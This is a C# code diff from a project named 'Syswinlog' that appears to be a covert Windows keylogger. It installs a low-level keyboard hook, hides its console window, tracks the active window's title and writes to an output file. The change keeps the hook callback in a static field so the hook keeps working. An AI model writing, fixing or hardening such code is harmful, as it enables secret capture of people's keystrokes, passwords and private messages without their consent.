@@ -36,7 +36,7 @@ namespace Syswinlog
             _activeWindowTextManager = new ActiveWindowTextManager();
             _activeWindowTextManager.Run();
 
-            _hookptr = SetHook(KeyBoardProcCallback);
+            _hookptr = SetHook(_proc);
             SetConsoleWindow(Constants.ConsoleWindowState.SW_HIDE);
 
             Application.Run();
@@ -142,6 +142,7 @@ namespace Syswinlog
 
         #region variable declarations
         private static IntPtr _hookptr = IntPtr.Zero;
+        private static readonly NativeMethods.LowLevelKeyboardProc _proc = KeyBoardProcCallback;
         private static bool uppercase;
         private static StreamWriter _outfile;
         private static StringBuilder _currentActiveWindow = new StringBuilder();
